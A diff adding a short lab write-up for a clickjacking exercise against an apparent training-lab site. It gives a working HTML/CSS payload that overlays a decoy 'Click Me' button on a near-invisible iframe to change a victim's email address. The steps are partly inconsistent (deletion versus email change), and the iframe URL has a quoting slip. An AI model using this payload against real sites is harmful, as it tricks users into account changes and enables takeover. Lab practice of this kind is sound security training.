@@ -1,0 +1,39 @@
+
+
+
+
+
+
+
+
+
+                                         LAB #2 Clickjacking with form input data prefilled from a URL parameter
+                            STEPS TO REPRODUCE ::-
+
+                        1. In the application login with your credentials.
+                        2. Navigate to /my-account there is a button delete account.
+                        3. craft a payload such that upon clicking on click-me that account is deleted.
+                        4. use this payload 
+                           <style>
+                                iframe {
+                                    position:relative;
+                                    width:600px;
+                                    height: 700px;
+                                    opacity: 0.001;
+                                    z-index: 2;
+                                }
+                                div {
+                                    position:absolute;
+                                    top:495px;
+                                    left:70px;
+                                    z-index: 1;
+                                    border:2px solid black; 
+                                    color:red;
+                                }
+
+                            </style>
+                            <div>Click Me </div>
+                            <iframe src="https://0a0000f30391d3b98061722f002e0088.web-security-academy.net/my-account?email="hacker@gmail.com"></iframe>
+
+                      deliver the payload to victim.
+                    5. when victim will click on click me his/her email address will be changed.
